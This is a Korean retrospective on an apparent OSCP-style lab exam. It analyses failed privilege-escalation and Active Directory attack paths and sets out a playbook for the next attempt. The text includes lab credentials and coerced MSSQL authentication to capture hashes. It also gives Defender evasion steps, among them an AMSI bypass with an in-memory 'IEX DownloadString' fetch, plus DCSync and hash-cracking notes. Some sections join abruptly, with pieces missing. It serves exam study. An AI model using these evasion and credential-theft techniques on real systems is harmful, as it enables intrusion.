### 3.2 192.168.104.111 — Defender 에 열거 도구가 막히고, 대체 수단으로 넘어가지 못함

경로: SMB `WebDev` 공유 익명 접근 → `legacy/Web.config` 에서 `dom / DarkBright789` → MSSQL `--local-auth` 로그인 → `aboroabmain.ServiceAccounts` 테이블에서 평문 23쌍 → `dom / GreenLantern456` → WinRM.

**막힌 지점 — Windows Defender.** WinRM 셸 획득 직후 winPEAS 를 배포했으나 Defender 실시간 보호에 차단당함. 이후 다른 열거 수단으로 전환하지 못한 채 20:45 에 종료.

근거:
- 히스토리에서 `evil-winrm -i 192.168.104.111 -u dom -p GreenLantern456` **바로 다음 줄**이 `cd git/peass/winpeas` → `python -m http.server 80` 임. winPEAS 를 111 대상으로 배포한 것이 확실함
- 차단 사실 자체는 산출물에 없음 — **evil-winrm 세션 안에서 친 명령은 `~/.zsh_history` 에 한 줄도 안 남기 때문**임. 차단은 사용자 증언에 근거함
- `~/OSCP-EXAM/111/` 에 winPEAS 출력 파일이 없음 — 차단과 일관됨
- 볼트 노트도 `whoami /all` 에서 끝남

**따라서 원인은 「안 찾아봤다」가 아니라 「도구가 죽었고 폴백이 없었다」임.** 이 구분이 중요한 이유는 대응이 완전히 다르기 때문임 — 전자는 습관 문제고, 후자는 **준비 문제**임.

**Defender 는 파일을 막지 명령을 막지 않음.** winPEAS·PowerUp·Seatbelt 는 시그니처가 박힌 바이너리라 디스크에 떨어지는 즉시 삭제되지만, 아래는 **전부 내장 명령이라 차단 대상이 아님**:

```powershell
whoami /priv ; whoami /groups
systeminfo
cmdkey /list
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
schtasks /query /fo LIST /v
wmic service get name,displayname,pathname,startmode
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' }
Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -ErrorAction SilentlyContinue |
  Select-String -Pattern 'password|pwd|connectionstring'
Get-LocalGroupMember Administrators
```

⚠️ 위 블록은 **이 박스에서 실행된 것이 아님.** 다음 시험용으로 정리한 대체 명령 목록이며, 이 박스의 실측 출력이 아님.

**남은 실마리 — 전부 미확인:**
- **`X$` 공유** — `smbclient -L` 결과에 `X$ Disk Default share` 로 잡혔음. X: 드라이브가 존재한다는 뜻이고, 비표준 볼륨은 그 자체가 리드임. 익명(`-N`)으로만 시도했고 `dom` 자격증명으로 재시도하지 않음. **이건 Defender 와 무관하게 Kali 쪽에서 할 수 있었던 확인임**
- **MSSQL 강제 인증** — `dom` 은 `aboroabmain` 에서 db_owner 였음. `xp_dirtree` · `xp_fileexist` 로 Kali 의 SMB 리스너를 향해 인증을 유발해 서비스 계정의 NetNTLMv2 를 회수하는 경로를 시도하지 않음. **이것도 타겟에 파일을 안 떨어뜨리므로 Defender 무관임**
- 서비스 권한 · 스케줄 작업 · AlwaysInstallElevated · 언쿼티드 경로 — 미확인
- `whoami /priv` 에 `SeImpersonatePrivilege` 가 **없었음** → 포테이토 계열 배제는 정확했음

또 하나 — SMB 스프레이가 **무의미하게 돌았음**:

```
SMB   192.168.104.111  445  OSCP  [+] OSCP\gary:Bkup2024Secure (Guest)
SMB   192.168.104.111  445  OSCP  [+] OSCP\mike:Bkup2024Secure (Guest)
...
```
출처: 볼트 노트 [[192.168.104.111]]

`(Guest)` 는 게스트 폴백으로 인증이 통과된 것이지 그 조합이 맞은 것이 아님. nxc 는 이를 성공으로 처리하고 다음 계정으로 넘어가므로, **23개 비번 중 대부분이 실제로는 시도되지 않음.** 게스트 폴백이 있는 SMB 대신 **WinRM · MSSQL** 로 스프레이했어야 함(두 서비스는 게스트 폴백이 없음).

```

**즉 `o.hughes` 자격증명 하나가 AD 40점 전부였음:**

1. `o.hughes` 는 **Remote Management Users** 소속 + **DC20 의 PSRemoteUsers** → `evil-winrm` 으로 DC 에 바로 붙어 proof.txt 확보
2. `o.hughes` → `IT Operations` 자가 추가 → 도메인 객체 WriteDacl → DCSync 권한 부여 → `secretsdump` 로 krbtgt · Administrator 회수 → DA
3. DA 로 SRV22 proof.txt

### 4.2 BloodHound 를 **수집하고도 열어보지 않음**

`~/.zsh_history` 대조 결과:

- `bloodhound-python` 을 두 번 실행함 (09:20 성공분 + `administrator` 해시로 시도한 실패분)
- `bloodhound` GUI(docker) 도 두 번 띄움
- 그런데 **이후 히스토리·볼트 노트 어디에도 `o.hughes` 나 `IT Operations` 가 한 번도 등장하지 않음**

`o.hughes` 가 등장하는 곳은 전부 기계적 나열임 — `GetADUsers` 사용자 목록, `GetNPUsers` 실패 로그, `lookupsid` RID 나열, users.csv 16행. **개별 대상으로 다뤄진 적이 없음.**

수집이 끝난 09:20 시점에 **4시간 13분**이 남아 있었음.

### 4.3 그 4시간에 무엇을 했는가

| 소요 | 작업 | 왜 실패했는가 |
|---|---|---|
| 3회 | `svc_mssql` 케르베로스팅 해시에 rockyou 재시도 | SPN 이 `MSSQLSvc/srv22.oscp.exam:1433` 인데 SRV22 에 1433 이 열려 있지 않음. 미끼였음 |
| 1회 | `impacket-ticketer` 골든티켓 | `-domain-sid S-1-5-21-4168247447-...` — **이 도메인의 SID 가 아님.** 실제 SID `S-1-5-21-1010576050-2316036354-870063271` 는 3시간 뒤 `lookupsid` 로 확인함 |
| 1회 | `impacket-ticketer` 실버티켓 (`cifs/srv22`) | 실버티켓은 **대상 서비스 계정(SRV22$)의 해시**로 서명해야 함. WS26 의 로컬 Administrator 해시를 씀 → 원리상 통과 불가 |
| 다수 | `nxc smb 172.16.104.202 -u users.txt -H <해시> -k` | 로컬 계정 해시를 도메인 사용자 목록과 Kerberos(`-k`)로 조합함. `-u administrator ... --local-auth` 였어야 함 |
| 1회 | `nxc ldap 172.168.104.200 ...` | **IP 오타** (`172.168` vs `172.16`). 존재하지 않는 호스트를 때림 |
| 1회 | `hashcat -m 3200 pass rockyou` | bcrypt 26개 일괄. 솔트가 개별이라 26배 일감 — 아래 4.4 참조 |
| 30분+ | WS26 의 `C:\xampp\mysql\backup` · `xampp` 재다운로드 | 이미 SYSTEM 을 딴 박스를 다시 파는 작업. 새 정보 없음 |

### 4.4 bcrypt 크랙은 시험 시간 안에 끝날 물건이 아니었음 (실측)

복기 중 실측한 수치:

```
Kali CPU (4코어, john --format=bcrypt)     : 약 290 c/s
Radeon RX 9060 XT (hashcat 7.1.2, OpenCL) : 969 H/s
  → rockyou 전수(14,344,385개) 기준 : CPU 약 16시간 / GPU 약 4시간
비교: 같은 CPU 에서 케르베로스팅(-m 13100) : 1,477,000 H/s
```

bcrypt cost 10 은 인스턴스마다 4KB S-box 를 굴려 GPU 병렬성을 의도적으로 죽이는 알고리즘임. 케르베로스팅 대비 **약 1500배** 느림.

따라서:
- **26개 일괄 = 산술적으로 4일치 작업.** 시작 시점에 이미 실패가 확정돼 있었음
- **o.hughes 하나로 좁혔더라도** GPU 없이 16시간 — 남은 4시간에 안 들어감

→ **`o.hughes` 비번의 출처가 bcrypt 가 아니었을 가능성이 높음.** `[가정]` — 시험 종료로 검증 불가.

**② DC20 의 SYSVOL / NETLOGON — READ 권한이 있었는데 한 번도 열지 않음**

```

- `-M gpp_password` 를 **SRV22(202)** 에 쐈음. GPP `cpassword`(Groups.xml)는 **DC 의 SYSVOL** 에 있음 — 대상이 처음부터 틀림

## 5. 결정적 실패 3건

### ① 정답을 수집해놓고 열지 않음

BloodHound 를 09:20 에 수집하고 GUI 까지 띄웠으나 그래프를 분석하지 않음. 이후 4시간을 **추측 기반 공격**(랜덤 티켓 위조, 대상 틀린 스프레이, 전수 크랙)에 씀.

**규율화**: 도메인 자격증명이 손에 들어오는 즉시 BloodHound 를 수집하고, **다른 공격을 시작하기 전에 그래프부터 읽는다.** 수집은 도구 실행이고 분석은 별개의 작업임 — 수집으로 끝내지 말 것.

### ② 도구가 막혔을 때 두 번째 수단이 없음

111 에서 셸을 잡고 winPEAS 를 배포했으나 **Defender 에 차단**당함. 그 뒤 대체 열거 수단을 시도하지 않고 종료. 112 는 브루트포스가 소득 없자 **확장자·사전·vhost·5985 중 무엇도 바꾸지 않고** 같은 명령을 재실행한 뒤 포기. 합계 30점.

**핵심은 「안 했다」가 아니라 「하나가 막히자 벡터 전체가 멈췄다」임.** Defender 는 2026년 Windows 박스의 기본값이고, winPEAS 차단은 예외 상황이 아니라 **예상 상황**임.

**규율화**:
- 셸을 잡으면 즉시 열거하되, **자동화 도구가 죽으면 곧바로 내장 명령 폴백으로 넘어간다**(§7 Defender 플레이북)
- **타겟에 파일을 안 떨어뜨리는 벡터를 먼저 소진한다** — 공유 열거, DB 강제 인증, 네트워크 측 열거는 AV 와 무관함
- 박스를 접는 판단은 **폴백까지 소진한 뒤**에만 내린다

### ③ 실패한 시도를 진단 없이 반복

같은 rockyou 케르베로스팅을 플래그만 바꿔 3회, 같은 secretsdump 를 4회 반복함. 실패 메시지(`ERROR_DS_DRA_BAD_DN`, `rpc_s_access_denied`)는 매번 동일했음 — 입력이 아니라 **권한이 없다**는 뜻이었는데 입력만 바꿔 재시도함.

**규율화**: 같은 명령의 2회차 실패는 **에러 메시지를 읽으라는 신호**임. 3회차는 없다.

- **독립 박스 3대(60점)를 AD(40점)보다 먼저 훑는다.** 이번엔 AD 세트에 약 9시간 30분을 쓰고 10점을 얻었고, 0점으로 끝난 112 에는 1시간 40분만 배분함
- **종료 2시간 전부터는 새 벡터를 시작하지 않고 보고서·스크린샷을 정리한다**

### 셸을 잡은 직후 (예외 없음)

```
1. proof 형식으로 플래그 즉시 회수
   whoami; id; hostname; hostname -I; date; cat <플래그>   → 파일로 리다이렉트
2. 열거 스크립트 1회 실행 (harvest.sh / winPEAS) — 명령을 하나씩 치지 않는다
3. 스크린샷 (박스가 살아 있을 때만 가능)
4. 그 다음에 권한상승 판단
```

### ★ Windows Defender 플레이북 — 이번 시험에서 10점을 날린 지점

**전제를 바꿀 것: Defender 는 켜져 있는 것이 기본이고, winPEAS 차단은 예상 상황임.** 차단당한 시점부터 계획을 세우면 늦음.

**0단계 — 켜져 있는지 먼저 확인** (내장 명령, 차단 안 됨)

```powershell
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected
Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, DisableRealtimeMonitoring
```
→ `ExclusionPath` 가 잡히면 **그 경로에 도구를 떨어뜨리면 그대로 실행됨.** 제일 먼저 볼 것.

**1단계 — 파일을 안 떨어뜨리는 벡터를 먼저 소진** (AV 와 무관)

- SMB 공유 전수 열거 — 익명뿐 아니라 **획득한 자격증명으로 재시도**. 비표준 공유(`X$` 같은 별도 볼륨)는 그 자체가 리드
- MSSQL/MySQL 접근이 있으면 **강제 인증**으로 서비스 계정 해시 회수 — `xp_dirtree '\\<kali>\x'` + responder
- 네트워크 측 열거(nxc 모듈 · ldap · rpc) 전부

**2단계 — 내장 명령 수동 열거** (바이너리가 아니라 차단 대상이 아님)

```powershell
whoami /priv ; whoami /groups
systeminfo ; wmic qfe list brief
cmdkey /list
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
schtasks /query /fo LIST /v
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
  Select-Object Name, PathName, StartMode
Get-LocalGroupMember Administrators
Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.kdbx,*.ps1 -ErrorAction SilentlyContinue |
  Select-String -Pattern 'password|pwd|connectionString'
Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
```

⚠️ 위 블록은 **다음 시험용 준비 목록임.** 111 에서 실행된 적 없고 실측 출력이 아님.

**3단계 — 그래도 도구가 필요하면**

- `winPEAS.bat` — .NET 바이너리보다 시그니처가 훨씬 얕음. 먼저 시도할 것
- `winPEASany_ori.exe`(비난독화 원본 빌드) 또는 문자열을 바꿔 직접 재컴파일
- AMSI 우회 후 `IEX (New-Object Net.WebClient).DownloadString(...)` 로 **디스크를 거치지 않고** PowerUp·Seatbelt 를 메모리 실행
- 쓰기 가능한 제외 경로(0단계에서 확인)로 투하

**준비 항목 — 시험 전에 미리 만들어둘 것:**
- [ ] `winPEAS.bat` · 재컴파일한 winPEAS · Seatbelt 를 Kali 배포 디렉터리에 미리 배치
- [ ] AMSI 우회 원라이너를 손에 익혀둘 것 (동작 확인까지)
- [ ] 위 2단계 명령 묶음을 **복붙 한 덩어리**로 준비 — 왕복 줄이는 것이 핵심

### AD 세트

```
1. 도메인 자격증명 확보 즉시 BloodHound 수집
2. ★ 다른 공격을 시작하기 전에 그래프를 읽는다 ★
   - Shortest Path to Domain Admins

   - 비기본 ACL 엣지 (WriteDacl · GenericAll · AddMember · AddKeyCredentialLink)

   smbclient //<DC>/SYSVOL -U '<user>%<pass>'
   find . -name Groups.xml -o -name "*.bat" -o -name "*.vbs" -o -name "*.ps1"
4. 그 다음에 케르베로스팅 · AS-REP · 스프레이
```

### 크랙 판단

- **케르베로스팅(`-m 13100`) · NTLM(`-m 1000`)** — 1.5M H/s 급. 돌려도 됨
- **bcrypt(`-m 3200`) · scrypt · argon2** — 1000 H/s 급. **대상을 1개로 좁히지 못하면 시작하지 말 것.** 좁혔어도 GPU 없이 rockyou 전수는 16시간
- 판정 기준: **"이 크랙이 시험 시간 안에 끝나는가"** 를 먼저 계산할 것. `해시 개수 × 사전 크기 ÷ 속도`

### ★ 웹 열거 — 112 에서 20점을 날린 지점

**0단계 — 브루트포스보다 «먼저» 할 것**

- **사이트를 눈으로 연다.** 스크린샷을 남긴다. 112 는 스크린샷이 0장이고 페이지를 본 기록이 없음
- **HTML 소스를 저장하고 읽는다** — 링크 · 폼 · 파라미터 · 주석 · JS 안의 엔드포인트. 브루트포스로 찾는 것보다 빠름
- 확장자를 **응답에서 확인**한다. `X-Powered-By` · `Server` · 링크의 실제 확장자

**1단계 — 확장자를 스택에 맞춘다 (이번 실패의 핵심)**

```
IIS / ASP.NET  →  -x aspx,asmx,ashx,asp,config,txt,bak
PHP            →  -x php,phtml,inc,bak,txt,old
Java           →  -x jsp,jspx,do,action
공통 추가       →  ,zip,7z,sql,log,git
```

**판정 기준: 확장자 하나 추가 비용은 「단어 수 ÷ req/s」 = 대개 1분 내외임.** 아낄 대상이 아님.
→ 실측: 29,999단어 사전에서 확장자 1개 = 30,000요청 = 약 1분.

**2단계 — 커버리지**

- **디렉터리 사전과 파일 사전을 둘 다 돌린다** — `raft-medium-directories` + `raft-medium-files`
- **찾은 vhost 마다 «같은 강도로» 돌린다.** 112 는 `jobs.` 를 한 번, 잘못된 확장자로 훑고 끝냄. 정작 콘텐츠는 루트보다 서브도메인에 많았음
- **vhost 를 퍼징한다** — `ffuf -u http://<IP>/ -H "Host: FUZZ.<도메인>" -w <서브도메인사전> -fs <기본응답크기>`
- **같은 명령을 두 번 돌리지 않는다.** 재실행할 거면 인자를 바꾼다

**3단계 — 웹 외 서비스를 잊지 않는다**

- **5985/5986(WinRM) · 3389 이 열려 있으면 웹에서 얻은 이름으로 스프레이한다.** 112 는 whatweb 이 직원 6명을 줬는데 스프레이 0회
  `username-anarchy -i names.txt > users.txt` → `nxc winrm <IP> -u users.txt -p <후보> --continue-on-success`

**4단계 — DB 접근을 얻으면**

- **테이블을 전수 조회한다.** `users` 만 보고 끝내지 않는다 — 티켓 · 문의 · 메모 · 설정 테이블에 평문이 있다 (AD 세트에서 11개 중 1개만 봄)
- 웹루트의 `logs/` · `backup/` · `database/` · `.git/` 는 항상 확인

## 8. 잘한 것 — 유지할 것

- **110 의 pspy → cron → `rsync -aL` 심볼릭 링크 체인** 은 판단·실행 모두 정확했음
- **WS26 에서 UDF 실패 후 `INTO OUTFILE` 로 전환**한 판단 전환이 빨랐음
- **웹셸로 플래그를 읽지 않고 리버스셸을 붙여 대화형에서 `type`** 한 것 — 규정 준수. 웹셸 플래그는 0점임
- **ligolo 피벗 구성** 자체는 성공했고 내부망 스캔까지 이어짐
- 실패 산출물(시도했다 안 된 파일들)을 지우지 않고 남겨둔 것 — 이 복기가 가능했던 이유임

## 9. 복기 중 진행 중인 작업

`o.hughes` 의 bcrypt 해시를 실제로 깰 수 있는지 확인 중임. 결과는 4장 4.4의 `[가정]`(비번 출처가 bcrypt 가 아니었다)을 확정하거나 반증함.

```
대상   $2y$10$YtHYEdY6AVa60Epg8UXKF0bonk/wNGiCuLL1TH3.0HGOJo/.wNSJB
CPU    Kali · john --format=bcrypt · rockyou 전수 · 진행 중
GPU    RX 9060 XT · hashcat -m 3200 · rockyou 전수 · 진행 중
```

- 맞춤 후보 4.4만개(이 시험에서 관측된 「단어+단어+숫자」 패턴 조합) 시도 → **미발견**
- 두 작업 모두 미완. 완료 시 이 절에 결과를 추가할 것

> **참고 — john 이 이 해시를 로드하지 못하는 문제**
> 이 bcrypt 는 솔트·다이제스트의 마지막 문자가 비정규 형태(`...UXKF0`, `...wNSJB`)라 john 이 파싱을 거부함. 버려지는 비트라 값은 동일하므로 정규화하면 로드됨 — `...UXKFu`, `...wNSJ.`. hashcat 은 원본을 그대로 받아들임.
